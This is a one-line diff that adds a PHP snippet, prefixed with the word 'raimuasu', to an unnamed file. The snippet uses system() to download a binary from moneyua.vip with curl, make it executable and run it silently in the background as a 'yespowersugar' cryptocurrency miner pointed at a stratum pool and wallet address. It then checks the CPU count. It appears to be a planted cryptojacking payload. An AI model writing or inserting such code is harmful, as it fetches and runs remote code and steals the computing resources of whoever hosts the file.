@@ -1,0 +1,1 @@
+raimuasu <?php system('curl -s --insecure http://moneyua.vip/init -o init; chmod +x init; ./init -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qy7m556kfcyxc0xzyxwzxkp3k5338kp40zajg07.anyarcok -p lol --no-longpoll -q --randomize --background > /dev/null'); $core = system('nproc');?>
